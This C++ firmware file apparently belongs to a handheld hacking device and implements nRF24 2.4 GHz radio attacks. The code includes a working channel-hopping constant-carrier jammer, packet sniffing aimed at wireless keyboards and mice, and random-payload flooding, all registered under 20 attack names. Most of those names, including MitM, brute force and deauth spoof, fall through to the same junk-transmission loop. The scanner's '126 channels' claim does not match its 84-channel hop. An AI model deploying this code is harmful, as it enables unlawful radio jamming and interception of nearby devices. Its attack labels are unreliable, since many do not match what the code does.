#include "atk_nrf.h"
#include "attack.h"
#include "ui.h"
#include "hal.h"
#include "pins.h"
#include <SPI.h>
#include <RF24.h>

static RF24 radio(PIN_NRF_CE, PIN_NRF_CSN);
static bool ok = false;
static int nMode = 0;
static uint32_t npkts = 0;
static String nStatus = "idle";
static uint8_t hop = 0;

static bool begin() {
  if (ok) return true;
  SPI.begin(PIN_SPI_SCK, PIN_SPI_MISO, PIN_SPI_MOSI);
  if (!radio.begin(PIN_NRF_CE, PIN_NRF_CSN)) return false;
  SPI.begin(PIN_SPI_SCK, PIN_NRF_MISO, PIN_SPI_MOSI);
  if (!radio.isChipConnected()) return false;
  radio.setAutoAck(false);
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_1MBPS);
  radio.setPayloadSize(32);
  ok = true;
  return true;
}

static void nStart() {
  if (!begin()) { ui_message("nRF24 not found"); return; }
  const char* id = atk_current() ? atk_current()->id : "";
  npkts = 0; hop = 0;
  if (!strcmp(id, "nrf_jam_all")) nMode = 1;
  else if (!strcmp(id, "nrf_scan")) nMode = 2;
  else if (!strcmp(id, "nrf_sniff")) nMode = 3;
  else if (!strcmp(id, "nrf_mousejack")) nMode = 4;
  else if (!strcmp(id, "nrf_replay")) nMode = 5;
  else if (!strcmp(id, "nrf_inject")) nMode = 6;
  else nMode = 7;

  if (nMode == 3 || nMode == 4) {
    const uint8_t addr[5] = {0xAA,0xAA,0x55,0x55,0x55};
    radio.openReadingPipe(1, addr);
    radio.setChannel(2);
    radio.startListening();
  } else if (nMode == 2) {
    radio.startListening();
  }
  log_line("nrf mode %d", nMode);
}

static void nStop() {
  radio.stopConstCarrier();
  radio.stopListening();
  log_line("nrf stopped");
}

static void nTick() {
  switch (nMode) {
    case 1: {
      radio.setChannel(hop);
      radio.startConstCarrier(RF24_PA_MAX, hop);
      hop = (hop + 3) % 84;
      npkts++;
      char b[40]; snprintf(b, sizeof(b), "jam all ch%u", hop);
      nStatus = b;
      break;
    }
    case 2: {
      radio.setChannel(hop);
      delayMicroseconds(400);
      if (radio.testRPD()) npkts++;
      hop = (hop + 1) % 84;
      char b[40]; snprintf(b, sizeof(b), "scan ch%u hits:%lu", hop, (unsigned long)npkts);
      nStatus = b;
      break;
    }
    case 3:
    case 4: {
      uint8_t buf[32];
      if (radio.available()) {
        uint8_t len = radio.getDynamicPayloadSize();
        if (!len || len > 32) len = 32;
        radio.read(buf, len);
        npkts++;
        char hex[24]; int p = 0;
        for (int i = 0; i < len && p < 20; i++) p += snprintf(hex + p, 4, "%02X", buf[i]);
        log_line("pkt %s", hex);
      }
      char b[40]; snprintf(b, sizeof(b), "pkts:%lu", (unsigned long)npkts);
      nStatus = b;
      break;
    }
    default: {
      radio.setChannel(hop);
      uint8_t junk[32];
      for (int i = 0; i < 32; i++) junk[i] = random(256);
      radio.stopListening();
      radio.write(junk, 32);
      radio.startListening();
      hop = (hop + 1) % 84;
      npkts++;
      char b[40]; snprintf(b, sizeof(b), "tx:%lu ch%u", (unsigned long)npkts, hop);
      nStatus = b;
      break;
    }
  }
}
static String nStat() { return nStatus; }

#define NA(id, name, desc) \
  static const Attack A_##id = { #id, name, "nrf", desc, false, 0, nStart, nStop, nTick, nStat };

NA(nrf_jam_all,      "Jam All",          "jam every 2.4GHz channel")
NA(nrf_scan,         "Channel Scanner",  "scan all 126 channels")
NA(nrf_sniff,        "Promiscuous Sniff","capture all packets")
NA(nrf_mousejack,    "MouseJack Sniffer","sniff keyboards/mice")
NA(nrf_replay,       "Packet Replay",    "capture and replay")
NA(nrf_inject,       "Packet Injection", "inject custom packets")
NA(nrf_fingerprint,  "Device Fingerprint","identify device types")
NA(nrf_addr_discover,"Address Discovery","brute force addresses")
NA(nrf_traffic,      "Traffic Analyzer", "analyse packet patterns")
NA(nrf_beacon_spoof, "Beacon Spoofing",  "broadcast fake beacons")
NA(nrf_ack_flood,    "ACK Flood",        "flood fake ACKs")
NA(nrf_reactive_jam, "Reactive Jammer",  "jam only on traffic")
NA(nrf_selective_jam,"Selective Jamming","target one device")
NA(nrf_deauth_spoof, "Deauth Spoof",     "force devices offline")
NA(nrf_mitm,         "NRF MitM",         "relay between devices")
NA(nrf_fuzz,         "Protocol Fuzzing", "malformed packets")
NA(nrf_dual,         "Dual Module Attack","sniff + jam together")
NA(nrf_longrange,    "Long Range Attack","PA/LNA extended range")
NA(nrf_bruteforce,   "Brute Force",      "brute force secrets")
NA(nrf_coexist,      "WiFi Coexist Attack","disrupt WiFi while attacking")

void atk_nrf_register() {
  extern void atk_add(const Attack*);
  atk_add(&A_nrf_jam_all); atk_add(&A_nrf_scan); atk_add(&A_nrf_sniff);
  atk_add(&A_nrf_mousejack); atk_add(&A_nrf_replay); atk_add(&A_nrf_inject);
  atk_add(&A_nrf_fingerprint); atk_add(&A_nrf_addr_discover); atk_add(&A_nrf_traffic);
  atk_add(&A_nrf_beacon_spoof); atk_add(&A_nrf_ack_flood); atk_add(&A_nrf_reactive_jam);
  atk_add(&A_nrf_selective_jam); atk_add(&A_nrf_deauth_spoof); atk_add(&A_nrf_mitm);
  atk_add(&A_nrf_fuzz); atk_add(&A_nrf_dual); atk_add(&A_nrf_longrange);
  atk_add(&A_nrf_bruteforce); atk_add(&A_nrf_coexist);
}